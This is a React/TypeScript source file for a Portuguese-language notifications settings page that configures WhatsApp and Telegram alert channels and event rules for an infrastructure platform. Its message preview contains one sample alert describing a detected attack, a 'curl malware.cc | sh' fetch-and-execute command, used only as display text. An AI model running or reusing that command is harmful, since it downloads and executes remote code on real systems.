import { useState } from 'react'
import {
  Bell, MessageCircle, Send, Settings, Power, TestTube, Check,
  Loader2, Smartphone, Bot, Shield, Server, AlertTriangle, Zap,
} from 'lucide-react'
import { useApp } from '../../store/AppContext'
import {
  defaultChannels, defaultRules, formatAlertMessage, buildEvolutionPayload, buildTelegramPayload,
  type NotificationChannel, type NotificationRule, type WhatsAppConfig, type TelegramConfig,
} from '../../lib/notifications'

const eventIcons: Record<string, typeof Bell> = {
  machine_down: Server,
  machine_critical: AlertTriangle,
  vulnerability_critical: Shield,
  attack_detected: Zap,
  baremetal_shutdown: Power,
  provisioning_complete: Check,
  backup_failed: AlertTriangle,
}

export default function Notifications() {
  const { toast } = useApp()
  const [channels, setChannels] = useState<NotificationChannel[]>(defaultChannels)
  const [rules, setRules] = useState<NotificationRule[]>(defaultRules)
  const [testing, setTesting] = useState<string | null>(null)
  const [editChannel, setEditChannel] = useState<string | null>(null)

  const toggleChannel = (id: string) => setChannels((cs) => cs.map((c) => c.id === id ? { ...c, enabled: !c.enabled } : c))
  const toggleRule = (id: string) => setRules((rs) => rs.map((r) => r.id === id ? { ...r, enabled: !r.enabled } : r))

  const testChannel = async (ch: NotificationChannel) => {
    setTesting(ch.id)
    const message = formatAlertMessage('machine_down', { machine: 'srv-test01', detail: '⚡ Mensagem de teste do ATLAB Platform' })

    if (ch.type === 'whatsapp') {
      const payload = buildEvolutionPayload(ch.config as WhatsAppConfig, message)
      toast('info', `WhatsApp: POST ${payload.url}\nBody: ${JSON.stringify(payload.body)}`)
    } else {
      const payload = buildTelegramPayload(ch.config as TelegramConfig, message)
      toast('info', `Telegram: POST ${payload.url}\nChat: ${(ch.config as TelegramConfig).chatId}`)
    }

    // Simulate API call
    await new Promise((r) => setTimeout(r, 1500))
    toast('success', `Mensagem de teste enviada via ${ch.name}`)
    setTesting(null)
  }

  const updateConfig = (channelId: string, key: string, value: string) => {
    setChannels((cs) => cs.map((c) => {
      if (c.id !== channelId) return c
      return { ...c, config: { ...c.config, [key]: value } }
    }))
  }

  return (
    <div>
      <div className="mb-6">
        <h1 className="text-2xl font-bold text-white flex items-center gap-2">
          <Bell className="w-6 h-6 text-accent-400" /> Notificações
        </h1>
        <p className="text-atlab-400 mt-1">Integração com WhatsApp (Evolution API) e Telegram</p>
      </div>

      {/* Channels */}
      <h2 className="text-sm font-semibold text-atlab-300 uppercase tracking-wider mb-3">Canais de Notificação</h2>
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 mb-8">
        {channels.map((ch) => (
          <div key={ch.id} className={`bg-atlab-900 border rounded-xl p-5 transition-all ${ch.enabled ? 'border-atlab-800' : 'border-atlab-800/50 opacity-60'}`}>
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-3">
                <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${ch.type === 'whatsapp' ? 'bg-emerald-500/10' : 'bg-blue-500/10'}`}>
                  {ch.type === 'whatsapp' ? <Smartphone className="w-5 h-5 text-emerald-400" /> : <Bot className="w-5 h-5 text-blue-400" />}
                </div>
                <div>
                  <h3 className="font-medium text-white">{ch.name}</h3>
                  <p className="text-xs text-atlab-400">{ch.type === 'whatsapp' ? 'Evolution API' : 'Telegram Bot API'}</p>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button onClick={() => testChannel(ch)} disabled={testing === ch.id}
                  className="flex items-center gap-1.5 px-3 py-1.5 bg-atlab-800 hover:bg-atlab-700 rounded-lg text-xs text-atlab-300 transition-colors">
                  {testing === ch.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <TestTube className="w-3 h-3" />}
                  Testar
                </button>
                <button onClick={() => setEditChannel(editChannel === ch.id ? null : ch.id)}
                  className="p-2 hover:bg-atlab-700 rounded-lg text-atlab-400 hover:text-white transition-colors">
                  <Settings className="w-4 h-4" />
                </button>
                <button onClick={() => toggleChannel(ch.id)}
                  className={`relative w-10 h-5 rounded-full transition-colors ${ch.enabled ? 'bg-emerald-500' : 'bg-atlab-700'}`}>
                  <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-all ${ch.enabled ? 'left-5' : 'left-0.5'}`} />
                </button>
              </div>
            </div>

            {/* Config editor */}
            {editChannel === ch.id && (
              <div className="pt-4 border-t border-atlab-800 space-y-3 animate-fade-in">
                {ch.type === 'whatsapp' ? (
                  <>
                    <ConfigInput label="Evolution API URL" value={(ch.config as WhatsAppConfig).evolutionApiUrl} onChange={(v) => updateConfig(ch.id, 'evolutionApiUrl', v)} placeholder="http://evolution.atlab.local:8080" />
                    <ConfigInput label="Instance Name" value={(ch.config as WhatsAppConfig).instanceName} onChange={(v) => updateConfig(ch.id, 'instanceName', v)} placeholder="atlab-alerts" />
                    <ConfigInput label="API Key" value={(ch.config as WhatsAppConfig).apiKey} onChange={(v) => updateConfig(ch.id, 'apiKey', v)} placeholder="sua-api-key" type="password" />
                    <ConfigInput label="Número destino" value={(ch.config as WhatsAppConfig).targetNumber} onChange={(v) => updateConfig(ch.id, 'targetNumber', v)} placeholder="5511999990000@s.whatsapp.net" />
                    <ConfigInput label="Group ID (opcional)" value={(ch.config as WhatsAppConfig).groupId || ''} onChange={(v) => updateConfig(ch.id, 'groupId', v)} placeholder="120363xxx@g.us" />
                    <div className="bg-atlab-850 rounded-lg p-3 text-xs text-atlab-400">
                      <p className="font-medium text-atlab-300 mb-1">Formato da requisição:</p>
                      <code className="block text-[10px] font-mono text-accent-300">POST {'{url}'}/message/sendText/{'{instance}'}</code>
                      <code className="block text-[10px] font-mono text-atlab-500 mt-1">Header: apikey: {'{key}'}</code>
                      <code className="block text-[10px] font-mono text-atlab-500">Body: {`{ "number": "...", "text": "..." }`}</code>
                    </div>
                  </>
                ) : (
                  <>
                    <ConfigInput label="Bot Token" value={(ch.config as TelegramConfig).botToken} onChange={(v) => updateConfig(ch.id, 'botToken', v)} placeholder="123456:ABC-DEF..." type="password" />
                    <ConfigInput label="Chat ID" value={(ch.config as TelegramConfig).chatId} onChange={(v) => updateConfig(ch.id, 'chatId', v)} placeholder="-1001234567890" />
                    <div className="bg-atlab-850 rounded-lg p-3 text-xs text-atlab-400">
                      <p className="font-medium text-atlab-300 mb-1">Como obter:</p>
                      <p>1. Crie bot via @BotFather → copie token</p>
                      <p>2. Adicione o bot ao grupo</p>
                      <p>3. Use @raw_data_bot ou /getUpdates para pegar chat_id</p>
                    </div>
                  </>
                )}
                <button onClick={() => { setEditChannel(null); toast('success', 'Configuração salva') }}
                  className="w-full py-2 bg-accent-600 hover:bg-accent-500 rounded-lg text-white text-sm font-medium transition-colors">
                  Salvar Configuração
                </button>
              </div>
            )}
          </div>
        ))}
      </div>

      {/* Rules */}
      <h2 className="text-sm font-semibold text-atlab-300 uppercase tracking-wider mb-3">Regras de Notificação</h2>
      <div className="bg-atlab-900 border border-atlab-800 rounded-xl overflow-hidden">
        <table className="w-full">
          <thead><tr className="border-b border-atlab-800">
            <th className="text-left px-5 py-3 text-xs font-medium text-atlab-400 uppercase">Evento</th>
            <th className="text-left px-5 py-3 text-xs font-medium text-atlab-400 uppercase">Canais</th>
            <th className="text-right px-5 py-3 text-xs font-medium text-atlab-400 uppercase">Ativo</th>
          </tr></thead>
          <tbody>
            {rules.map((rule) => {
              const Icon = eventIcons[rule.event] || Bell
              return (
                <tr key={rule.id} className="border-b border-atlab-800/50 hover:bg-atlab-850 transition-colors">
                  <td className="px-5 py-3">
                    <div className="flex items-center gap-3">
                      <Icon className="w-4 h-4 text-atlab-400" />
                      <span className="text-sm text-white">{rule.label}</span>
                    </div>
                  </td>
                  <td className="px-5 py-3">
                    <div className="flex gap-1.5">
                      {rule.channels.map((chId) => {
                        const ch = channels.find((c) => c.id === chId)
                        return ch ? (
                          <span key={chId} className={`flex items-center gap-1 text-[10px] px-2 py-0.5 rounded ${ch.type === 'whatsapp' ? 'bg-emerald-500/10 text-emerald-400' : 'bg-blue-500/10 text-blue-400'}`}>
                            {ch.type === 'whatsapp' ? <MessageCircle className="w-2.5 h-2.5" /> : <Send className="w-2.5 h-2.5" />}
                            {ch.type === 'whatsapp' ? 'WhatsApp' : 'Telegram'}
                          </span>
                        ) : null
                      })}
                    </div>
                  </td>
                  <td className="px-5 py-3 text-right">
                    <button onClick={() => toggleRule(rule.id)}
                      className={`relative w-10 h-5 rounded-full transition-colors ${rule.enabled ? 'bg-emerald-500' : 'bg-atlab-700'}`}>
                      <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-all ${rule.enabled ? 'left-5' : 'left-0.5'}`} />
                    </button>
                  </td>
                </tr>
              )
            })}
          </tbody>
        </table>
      </div>

      {/* Preview */}
      <div className="mt-8">
        <h2 className="text-sm font-semibold text-atlab-300 uppercase tracking-wider mb-3">Preview de mensagem</h2>
        <div className="bg-atlab-900 border border-atlab-800 rounded-xl p-5">
          <div className="bg-atlab-850 rounded-lg p-4 font-mono text-xs whitespace-pre-line text-atlab-200">
            {formatAlertMessage('attack_detected', { machine: 'srv-web01', detail: 'Comando suspeito: curl malware.cc | sh — por root@45.227.255.10' }).replace(/<\/?b>/g, '').replace(/<br>/g, '\n')}
          </div>
          <p className="text-xs text-atlab-500 mt-2">Esta mensagem seria enviada nos canais configurados para o evento "Ataque detectado"</p>
        </div>
      </div>
    </div>
  )
}

function ConfigInput({ label, value, onChange, placeholder, type }: { label: string; value: string; onChange: (v: string) => void; placeholder: string; type?: string }) {
  return (
    <div>
      <label className="block text-xs font-medium text-atlab-400 mb-1">{label}</label>
      <input type={type || 'text'} value={value} onChange={(e) => onChange(e.target.value)} placeholder={placeholder}
        className="w-full px-3 py-2 bg-atlab-900 border border-atlab-700 rounded-lg text-white text-sm placeholder-atlab-500 focus:outline-none focus:border-accent-500 font-mono" />
    </div>
  )
}
